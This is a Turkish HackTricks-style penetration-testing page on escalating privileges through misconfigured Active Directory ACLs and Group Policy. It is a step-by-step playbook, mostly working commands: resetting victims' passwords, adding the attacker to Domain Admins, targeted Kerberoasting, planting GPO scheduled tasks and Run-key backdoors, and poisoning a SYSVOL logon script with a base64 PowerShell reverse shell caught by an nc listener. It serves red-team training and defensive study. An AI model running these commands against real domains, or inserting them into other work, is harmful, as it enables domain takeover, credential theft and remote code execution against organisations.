# Active Directory ACLs/ACEs'nin Kötüye Kullanımı

{{#include ../../../banners/hacktricks-training.md}}

**Bu sayfa büyük ölçüde [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) ve [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges) tekniklerinin bir özetidir. Daha fazla detay için orijinal makalelere bakın.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Kullanıcı Üzerinde GenericAll Hakları**

Bu yetki, saldırgana hedef bir kullanıcı hesabı üzerinde tam kontrol sağlar. `GenericAll` hakları `Get-ObjectAcl` komutu ile doğrulandıktan sonra, saldırgan şunları yapabilir:

- **Hedefin Parolasını Değiştirme**: `net user <username> <password> /domain` kullanarak saldırgan kullanıcının parolasını sıfırlayabilir.
- Linux'tan, Samba `net rpc` ile SAMR üzerinden aynı işlemi yapabilirsiniz:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Hesap devre dışıysa, UAC bayrağını temizleyin**: `GenericAll` `userAccountControl` düzenlemeye izin verir. Linux'tan, BloodyAD `ACCOUNTDISABLE` bayrağını kaldırabilir:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Kullanıcının hesabına bir SPN atayarak onu kerberoastable hale getirin, sonra Rubeus ve targetedKerberoast.py kullanarak ticket-granting ticket (TGT) hashes'lerini çıkarıp kırmayı deneyin.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Kullanıcı için pre-authentication'ı devre dışı bırakın; böylece hesabı ASREPRoasting'e karşı savunmasız hale gelir.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Kullanıcıda `GenericAll` olduğunda, sertifika tabanlı bir kimlik bilgisi ekleyebilir ve parolasını değiştirmeden onun olarak kimlik doğrulaması yapabilirsiniz. Bkz:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Grup Üzerinde GenericAll Hakları**

Bu ayrıcalık, bir saldırganın `Domain Admins` gibi bir grup üzerinde `GenericAll` haklarına sahip olması durumunda grup üyeliklerini değiştirmesine olanak tanır. Grubun distinguished name'ini `Get-NetGroup` ile belirledikten sonra saldırgan şunları yapabilir:

- **Kendilerini Domain Admins grubuna ekleme**: Bu, doğrudan komutlarla veya Active Directory ya da PowerSploit gibi modüller kullanılarak yapılabilir.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Linux'ten ayrıca BloodyAD'i kullanarak, üzerlerinde GenericAll/Write üyeliğiniz olduğunda kendinizi istediğiniz gruplara ekleyebilirsiniz. Hedef grup “Remote Management Users” içine gömülü ise, o grubu dikkate alan sunucularda hemen WinRM erişimi kazanırsınız:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Bu ayrıcalıkları bir bilgisayar nesnesi veya bir kullanıcı hesabı üzerinde bulundurmak şunlara izin verir:

- **Kerberos Resource-based Constrained Delegation**: Bir bilgisayar nesnesinin ele geçirilmesini sağlar.
- **Shadow Credentials**: Bu tekniği, ayrıcalıkları kullanarak Shadow Credentials oluşturmaya ve böylece bir bilgisayar veya kullanıcı hesabını taklit etmeye yarar.

## **WriteProperty on Group**

Eğer bir kullanıcı belirli bir grup için (ör. `Domain Admins`) tüm nesneler üzerinde `WriteProperty` haklarına sahipse, şunları yapabilir:

- **Kendilerini `Domain Admins` Grubuna Ekleme**: `net user` ve `Add-NetGroupUser` komutlarının birleştirilmesiyle başarılabilir; bu yöntem domain içinde ayrıcalık yükseltmesine izin verir.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Grup Üzerinde Self (Kendi Üyeliği)**

Bu ayrıcalık, saldırganların grup üyeliğini doğrudan değiştiren komutlar aracılığıyla kendilerini `Domain Admins` gibi belirli gruplara eklemelerine olanak tanır. Aşağıdaki komut dizisini kullanmak, kendini eklemeye izin verir:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Benzer bir ayrıcalık olan bu hak, saldırganların söz konusu gruplar üzerinde `WriteProperty` hakkına sahip olmaları durumunda grup özelliklerini değiştirerek kendilerini doğrudan gruplara eklemelerine olanak tanır. Bu ayrıcalığın doğrulanması ve uygulanması şu şekilde gerçekleştirilir:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Bir kullanıcı üzerinde `User-Force-Change-Password` için `ExtendedRight`'e sahip olmak, mevcut parolayı bilmeden parola sıfırlamaya izin verir. Bu hakkın doğrulanması ve kötüye kullanılması PowerShell veya alternatif komut satırı araçlarıyla yapılabilir; etkileşimli oturumlar ve etkileşimsiz ortamlar için tek satırlık çözümler dahil olmak üzere bir kullanıcının parolasını sıfırlamak için çeşitli yöntemler sunar. Komutlar basit PowerShell çağrılarından Linux'ta `rpcclient` kullanmaya kadar değişir ve saldırı vektörlerinin çok yönlülüğünü gösterir.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

Eğer bir saldırganın bir grup üzerinde `WriteOwner` hakları olduğu tespit edilirse, grubun sahipliğini kendisine çevirebilir. Bu, ilgili grup `Domain Admins` olduğunda özellikle etkili olur; çünkü sahipliğin değiştirilmesi grup öznitelikleri ve üyelik üzerinde daha geniş kontrol sağlar. Süreç doğru nesneyi `Get-ObjectAcl` ile belirlemeyi ve ardından sahibi `Set-DomainObjectOwner` kullanarak SID veya isim ile değiştirmeyi içerir.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Bu izin, bir saldırganın kullanıcı özelliklerini değiştirmesine olanak tanır. Özellikle, `GenericWrite` erişimi ile saldırgan, bir kullanıcının logon script yolunu değiştirerek kullanıcı oturumu açıldığında kötü amaçlı bir script'in çalışmasını sağlayabilir. Bu, hedef kullanıcının `scriptpath` özelliğini saldırganın script'ine işaret edecek şekilde güncellemek için `Set-ADObject` komutunun kullanılmasıyla gerçekleştirilir.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Bu ayrıcalıkla saldırganlar grup üyeliklerini değiştirebilir; örneğin kendilerini veya diğer kullanıcıları belirli gruplara ekleyebilirler. Bu süreç, bir credential object oluşturmayı, bunu kullanarak bir gruba kullanıcı ekleme veya kaldırma işlemleri yapmayı ve PowerShell komutlarıyla üyelik değişikliklerini doğrulamayı içerir.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Linux'te, Samba `net` grup üzerinde `GenericWrite` hakkına sahip olduğunuzda üye ekleyip/kaldırabilir (PowerShell/RSAT kullanılamadığında faydalıdır):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Bir AD nesnesine sahip olmak ve üzerinde `WriteDACL` ayrıcalıklarına sahip olmak, saldırganın nesne üzerinde kendisine `GenericAll` ayrıcalıkları vermesini sağlar. Bu, ADSI manipülasyonu yoluyla gerçekleştirilir; nesne üzerinde tam kontrol ve grup üyeliklerini değiştirme yeteneği sağlar. Bununla birlikte, Active Directory modülünün `Set-Acl` / `Get-Acl` cmdlet'lerini kullanarak bu ayrıcalıkları istismar etmeye çalışırken sınırlamalar vardır.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner hızlı ele geçirme (PowerView)

Kullanıcı veya servis hesabı üzerinde `WriteOwner` ve `WriteDacl` haklarına sahip olduğunuzda, PowerView kullanarak eski şifreyi bilmeden hesap üzerinde tam kontrolü ele geçirip parolasını sıfırlayabilirsiniz:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Notlar:
- Yalnızca `WriteOwner` izniniz varsa önce sahibi kendinize değiştirmeniz gerekebilir:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Parola sıfırlamasından sonra herhangi bir protokol (SMB/LDAP/RDP/WinRM) ile erişimi doğrulayın.

## **Etki Alanında Replikasyon (DCSync)**

The DCSync attack leverages specific replication permissions on the domain to mimic a Domain Controller and synchronize data, including user credentials. This powerful technique requires permissions like `DS-Replication-Get-Changes`, allowing attackers to extract sensitive information from the AD environment without direct access to a Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Yetki Devri <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Yetki Devri

Group Policy Objects (GPOs) yönetimi için devredilen erişim ciddi güvenlik riskleri oluşturabilir. Örneğin, `offense\spotless` gibi bir kullanıcıya GPO yönetim hakları devredilmişse **WriteProperty**, **WriteDacl**, ve **WriteOwner** gibi ayrıcalıklara sahip olabilir. Bu izinler kötü amaçlı kullanım için suistimal edilebilir; PowerView ile tespit edilir: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### GPO İzinlerini Listeleme

Yanlış yapılandırılmış GPO'ları belirlemek için PowerSploit'in cmdlet'leri zincirlenebilir. Bu, belirli bir kullanıcının yönetme iznine sahip olduğu GPO'ların keşfedilmesini sağlar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Belirli Bir Politika Uygulanan Bilgisayarlar**: Belirli bir GPO'nun hangi bilgisayarlara uygulandığını çözümlemek mümkündür; bu, potansiyel etkinin kapsamını anlamaya yardımcı olur. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Belirli Bir Bilgisayara Uygulanan Politikalar**: Bir bilgisayara hangi politikaların uygulandığını görmek için `Get-DomainGPO` gibi komutlar kullanılabilir.

**Belirli Bir Politika Uygulanan OU'lar**: Belirli bir politikadan etkilenen organizasyon birimleri (OU'lar) `Get-DomainOU` kullanılarak belirlenebilir.

GPO'ları listelemek ve içlerindeki sorunları bulmak için [**GPOHound**](https://github.com/cogiceo/GPOHound) aracını da kullanabilirsiniz.

### GPO'yu Suistimal Etme - New-GPOImmediateTask

Yanlış yapılandırılmış GPO'lar kod yürütmek için suistimal edilebilir; örneğin, hemen yürütülecek bir scheduled task oluşturarak. Bu, etkilenen makinelerde bir kullanıcıyı yerel yöneticiler grubuna eklemek için yapılabilir ve ayrıcalıkları önemli ölçüde yükseltir:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy module, yüklüyse, yeni GPO'ların oluşturulmasına ve bağlanmasına, ayrıca etkilenen bilgisayarlarda backdoors çalıştırmak için registry values gibi tercihlerin ayarlanmasına izin verir. Bu yöntem, çalıştırılabilmesi için GPO'nun güncellenmesini ve bir kullanıcının bilgisayara giriş yapmasını gerektirir:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse, yeni GPO'lar oluşturmaya gerek kalmadan mevcut GPOs'lara görevler ekleyerek veya ayarlarını değiştirerek bunları abuse etme yöntemi sunar. Bu araç, değişiklikleri uygulamadan önce mevcut GPOs'ların değiştirilmesini veya yeni GPO'lar oluşturmak için RSAT araçlarının kullanılmasını gerektirir:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Politika Güncellemesini Zorlama

GPO güncellemeleri tipik olarak yaklaşık her 90 dakikada bir gerçekleşir. Bu süreci hızlandırmak için, özellikle bir değişiklik uygulandıktan sonra, hedef bilgisayarda `gpupdate /force` komutu kullanılarak anında politika güncellemesi zorlanabilir. Bu komut, GPO'larda yapılan değişikliklerin bir sonraki otomatik güncelleme döngüsünü beklemeden uygulanmasını sağlar.

### İç İşleyiş

Belirli bir GPO için Zamanlanmış Görevler incelendiğinde, örneğin `Misconfigured Policy` içinde `evilTask` gibi görevlerin eklendiği doğrulanabilir. Bu görevler, sistem davranışını değiştirmeyi veya ayrıcalıkları yükseltmeyi amaçlayan betikler veya komut satırı araçları ile oluşturulur.

Görevin yapısı, `New-GPOImmediateTask` tarafından oluşturulan XML yapılandırma dosyasında gösterildiği gibi, yürütülecek komut ve tetikleyiciler dahil olmak üzere zamanlanmış görevin ayrıntılarını ortaya koyar. Bu dosya, zamanlanmış görevlerin GPO'lar içinde nasıl tanımlandığını ve yönetildiğini gösterir; politika uygulamasının bir parçası olarak rastgele komutlar veya betikler çalıştırmak için bir yöntem sağlar.

### Users and Groups

GPO'lar ayrıca hedef sistemlerdeki kullanıcı ve grup üyeliklerinin değiştirilmesine imkan tanır. Users and Groups policy dosyalarını doğrudan düzenleyerek, saldırganlar yerel `administrators` gibi ayrıcalıklı gruplara kullanıcı ekleyebilirler. Bu, GPO yönetim izinlerinin devredilmesi yoluyla mümkündür; bu izinler, politika dosyalarının yeni kullanıcılar ekleyecek veya grup üyeliklerini değiştirecek şekilde düzenlenmesine olanak tanır.

Users and Groups için XML yapılandırma dosyası bu değişikliklerin nasıl uygulanacağını açıklar. Bu dosyaya girişler ekleyerek, belirli kullanıcılara etkilenen sistemler genelinde yükseltilmiş ayrıcalıklar verilebilir. Bu yöntem, GPO'ların kötüye kullanılması yoluyla doğrudan ayrıcalık yükseltme sağlar.

Ayrıca, logon/logoff betiklerini kullanmak, autoruns için kayıt defteri anahtarlarını değiştirmek, .msi dosyalarıyla yazılım yüklemek veya hizmet yapılandırmalarını düzenlemek gibi kod yürütme veya kalıcılık sağlama için ek yöntemler düşünülebilir. Bu teknikler, GPO'ların kötüye kullanılması yoluyla erişimi sürdürmek ve hedef sistemleri kontrol etmek için çeşitli yollar sunar.

## SYSVOL/NETLOGON Logon Script Poisoning

Writable paths under `\\<dc>\SYSVOL\<domain>\scripts\` or `\\<dc>\NETLOGON\` allow tampering with logon scripts executed at user logon via GPO. This yields code execution in the security context of logging users.

### Logon script'lerini Bulma
- Yapılandırılmış bir logon script'i için kullanıcı özniteliklerini inceleyin:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Etki alanı paylaşımlarını tarayarak kısayolları veya betiklere yapılan referansları ortaya çıkarın:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- `.lnk` dosyalarını ayrıştırarak SYSVOL/NETLOGON'a işaret eden hedefleri çözümler (DFIR için kullanışlı bir yöntem ve doğrudan GPO erişimi olmayan saldırganlar için):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound, kullanıcı düğümlerinde mevcut olduğunda `logonScript` (scriptPath) özniteliğini görüntüler.

### Yazma erişimini doğrulayın (paylaşım listelerine güvenmeyin)
Otomatik araçlar SYSVOL/NETLOGON'u salt okunur gösteriyor olabilir, ancak alttaki NTFS ACLs yine de yazmaya izin verebilir. Her zaman test edin:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Dosya boyutu veya mtime değişiyorsa yazma izniniz var. Değiştirmeden önce orijinalleri saklayın.

### Poison a VBScript logon script for RCE

PowerShell reverse shell (revshells.com üzerinden oluşturun) başlatan bir komut ekleyin ve işlevi bozmamak için orijinal mantığı koruyun:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Host üzerinde dinleyin ve bir sonraki interactive logon'u bekleyin:
```bash
rlwrap -cAr nc -lnvp 443
```
Notlar:
- Çalıştırma, oturum açan kullanıcının token'ı altında gerçekleşir (not SYSTEM). Kapsam, bu script'i uygulayan GPO bağlantısıdır (OU, site, domain).
- Kullanım sonrası orijinal içerik/zaman damgalarını geri yükleyerek temizleyin.


## Referanslar

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)

{{#include ../../../banners/hacktricks-training.md}}
